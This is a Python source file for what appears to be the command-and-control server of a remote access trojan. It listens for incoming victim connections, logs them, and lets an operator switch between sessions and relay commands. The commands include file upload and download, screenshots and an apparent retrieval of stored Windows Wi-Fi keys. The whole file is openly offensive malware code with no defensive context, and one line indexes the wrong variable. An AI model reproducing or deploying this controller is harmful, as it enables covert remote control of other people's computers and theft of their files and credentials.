import sys
from server import Server
from threading import Thread
from datetime import datetime
from art import sword, colors, help_menu
from time import sleep
from random import choice

server = Server(5002, '0.0.0.0')
server.connection.bind((server.ip, server.port))
server.connection.listen()


def connect():
    print('\n\n')
    print(server.show_connections())
    choice = int(input('What connection? '))
    return server.connList[choice]


def handler(conn):
    index = server.connList.index(conn)
    print(f'CONNECTED TO {server.ip[index]}')
    connected = True
    server.conn_session = conn
    while connected:
        try:
            to_send = input('CMD :')
            if to_send == 'server exit':
                sys.exit()
            elif to_send == 'background session':
                server.conn_session = connect()  # CHANGING CONN HERE
                continue
            elif to_send == 'help menu':
                print(colors['OKGREEN'] + help_menu + colors['END'])
                continue
            elif to_send == server.DISCONNECT:
                print('Disconnecting')
                index = server.connList.index(server.conn_session)
                server.connList.pop(index)
                server.ipList.pop(index)
                server.sender('!DISCONNECT', server.conn_session)
                server.conn_session.close()
                server.conn_session = connect()
                break
            # elif to_send == '!EXIT':
            #     server.exit_all_connections()

            if to_send.split()[0] == 'upload':
                name = to_send.split()[1]
                content = server.read_file(name)
                to_send += ' ' + content

            server.sender(to_send, server.conn_session)
            received = server.receiver(server.conn_session)
            if to_send == 'screenshot':
                server.write_file(received, 'png')
                continue
            elif to_send.split()[0] == 'download':
                name = to_send.split()[1]
                server.download(content=received, name=name)
                print('DOWNLOADED')
            elif to_send == 'windows wifi':
                print()
                try:
                    for key, value in received.items():
                        print(f'{key:.<50} {value}')
                    print()
                except:
                    pass
                continue
            else:
                print(received)
        except Exception as E:
            print(E)


def wait():
    while True:
        print(f'Listening for connections on {server.ip}:{server.port}')
        conn, ip = server.connection.accept()
        server.ipList.append(ip)
        server.connList.append(conn)
        print(f'\nNew Connection from {ip[0]} {ip[1]}\n')
        with open('server_log.txt', 'a') as fil:
            fil.write(f'{str(datetime.now())} New Connection from {ip[0]} {ip[1]}\n')
        selectedconn = connect()
        Thread(target=handler,args=(selectedconn,)).start()


swordList = sword.split('\n')
for i in range(len(swordList)): # this is just for asthetics
    color = choice(list(colors.values()))
    print(color+swordList[i])
    sleep(0.03)
print(colors['END'])

wait()

# while True:
